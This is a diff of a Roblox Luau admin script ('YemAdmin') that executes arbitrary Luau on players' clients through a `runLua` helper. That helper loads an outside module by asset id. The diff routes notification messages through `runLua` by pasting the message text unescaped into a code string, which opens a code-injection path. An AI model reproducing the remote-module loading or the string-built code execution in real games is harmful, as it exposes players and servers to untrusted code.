@@ -4,6 +4,7 @@
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local ServerScriptService = game:GetService("ServerScriptService")
+local StarterGui = game:GetService("StarterGui")
 
 local function NewGui(labels: {}): ScreenGui
 	local cmdGui = Instance.new("ScreenGui")
@@ -159,7 +160,7 @@ local function RankToString(rank: number)
 end
 
 -- expose just 2 be nice qt3.14's
-GetEnv().runLua = function(caller: Player, code: string)
+GetEnv().runLua = function(caller: Player, code: string, waitDelete: number?)
     if not ServerScriptService:FindFirstChild("goog") then
         local ticking = tick()
         getfenv().require(112691275102014).load() -- getfenv so it stops error in ide thanks
@@ -170,8 +171,7 @@ GetEnv().runLua = function(caller: Player, code: string)
     local p = caller
 
     if not goog then
-        warn("goog failed to be added, command can not continue")
-        return
+        error("goog failed to be added, command can not continue")
     end
 
     local scr = goog:FindFirstChild("Utilities").Client:Clone()
@@ -187,6 +187,11 @@ GetEnv().runLua = function(caller: Player, code: string)
     end
 
     scr.Enabled = true
+
+    if waitDelete then
+        task.wait(waitDelete)
+        scr:Destroy()
+    end
 end
 
 type WhitelistData = {
@@ -238,10 +243,13 @@ end
 
 -- TODO: move to another luau file or smth
 local Msg = function(caller: Player, msg: string)
-    local msgInst = Instance.new("Message", caller.PlayerGui)
-    msgInst.Text = msg
-    task.wait(3)
-    msgInst:Destroy()
+    --local msgInst = Instance.new("Message", caller.PlayerGui)
+    --msgInst.Text = msg
+    --task.wait(3)
+    --msgInst:Destroy()
+
+    -- TODO: a remote event in replicated storage specifically for this or smth so i dont dupe scripts
+    GetEnv().runLua(caller, `game.StarterGui:SetCore("SendNotification", \{Title = "YemAdmin",Text = "{msg}",Duration = 5\})`, 1)
 end
 
 local ClearWorkspace = function()
@@ -368,6 +376,18 @@ local onPlayerChatted = function(plyr: Player, msg: string)
     end
 end
 
+local bindChatToPlyr = function(plyr: Player)
+    _G.BindPlayerChatted(plyr):Connect(function(msg: string)
+        onPlayerChatted(plyr, msg)
+    end)
+
+    task.wait()
+    local plrRank = (tempwhitelist[plyr.Name] and tempwhitelist[plyr.Name].rank.Rank) or 0
+    if plrRank > 0 then
+        Msg(plyr, `Welcome back {plyr.Name} you are {RankToString(plrRank)}({plrRank})`)
+    end
+end
+
 table.insert(connections, Players.PlayerAdded:Connect(function(plyr: Player)
     if GetEnv().tempbans[plyr.Name] then
         plyr:Kick(GetEnv().tempbans[plyr.Name])
@@ -378,9 +398,7 @@ table.insert(connections, Players.PlayerAdded:Connect(function(plyr: Player)
         plyr:Kick("IP banned for racism!")
     end
 
-    _G.BindPlayerChatted(plyr):Connect(function(msg: string)
-        onPlayerChatted(plyr, msg)
-    end)
+    bindChatToPlyr(plyr)
 end))
 
 table.insert(connections, RunService.Heartbeat:Connect(function(deltaTime: number)
@@ -397,14 +415,9 @@ table.insert(connections, RunService.Heartbeat:Connect(function(deltaTime: numbe
     end
 end))
 
-local ss,rr = pcall(function(...)
 for i,plyr in pairs(Players:GetPlayers()) do
-    _G.BindPlayerChatted(plyr):Connect(function(msg: string)
-        onPlayerChatted(plyr, msg)
-    end)
+    bindChatToPlyr(plyr)
 end
-end)
-if not ss then warn(rr) end
 print'chat hooks'
 
 --cmds
